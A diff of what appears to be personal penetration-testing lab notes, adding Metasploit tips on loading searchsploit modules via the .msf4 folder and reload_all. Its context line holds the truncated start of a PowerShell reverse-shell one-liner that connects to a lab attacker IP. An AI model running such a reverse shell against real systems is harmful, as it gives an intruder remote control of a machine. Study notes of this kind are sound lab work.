@@ -172,10 +172,20 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 - [Community vs Pro](https://www.rapid7.com/products/metasploit/download/editions/) 
 - [Exploits](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits)
   - paste: /usr/share/metasploit-framework/modules/exploits
-- msfconsole
+- Load Module
+  - Find module in searchsploit
+  - Copy module to same folder structure but in *.msf4/module/*
+  - in msfconsole run *reload_all*
+
+```
+# Find module in searchsploit
+searchsploit module_name
+
+# Create a similar folder as module in the msf path + 
+```
 - use exploit/multi/handler
   - post/multi = post exploitation (generic)
-  - 
+
 - search
   - platform:
   - type:
